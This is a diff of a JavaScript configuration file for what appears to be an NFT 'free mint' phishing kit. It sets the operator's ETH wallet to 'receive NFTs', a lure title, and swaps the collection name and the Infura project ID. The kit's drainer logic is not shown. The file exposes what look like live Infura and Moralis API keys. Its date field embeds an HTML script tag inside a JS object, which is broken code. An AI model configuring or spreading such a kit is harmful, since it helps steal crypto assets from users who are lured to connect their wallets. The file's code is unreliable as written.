@@ -1,10 +1,10 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
 const address = "0xf5450c06CafF5E3E26220D356184b81914CB7f6C";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "d0b2307f2b6d4a2fa21e59b88d8d4273"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const infuraId = "40143f32ad2741aeb80780804b7d39fc"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "cc4iF641cVC1v7wxhMoBSds1skRK3zp1ixTjm8jWE0iZtIfsDCEOhZJpFdjFOFRj"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Toxic Hamsters NFT",
+    name: "Buttheads",
     title: "Free {name} Mint", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: <script> document.write(new Date().toLocaleDateString()); </script>, // Today date
     medias: {
